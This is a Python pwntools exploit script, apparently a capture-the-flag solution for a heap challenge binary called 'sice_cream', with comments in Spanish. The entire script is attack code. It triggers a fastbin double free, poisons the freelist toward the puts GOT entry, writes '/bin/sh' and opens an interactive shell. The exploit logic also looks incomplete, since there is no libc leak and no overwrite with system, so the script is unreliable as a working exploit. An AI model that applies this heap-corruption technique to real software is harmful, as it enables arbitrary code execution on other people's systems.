#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
p = process('./sice_cream', env={'LD_PRELOAD': './libc.so.6'})

# Nombre
p.sendlineafter(b'name?', b'hacker')

def buy(size, flavor):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'How much', str(size).encode())
    p.sendlineafter(b'flavor?', flavor)
    
def eat(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'Which', str(idx).encode())

def reintroduce(name):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'name?', name)

# Test normal
buy(32, b'chocolate')
buy(32, b'vanilla')

# Free primero
eat(0)

# Intentar double free
eat(1)
eat(0)  # Double free!

print("[!] Double free ejecutado!")

# Ahora explotarlo
buy(32, p64(0x602018))  # GOT de puts

buy(32, b'BBBB')
buy(32, b'CCCC')

# Este malloc debería retornar GOT
buy(32, b'/bin/sh\x00')

# Trigger
eat(3)

p.interactive()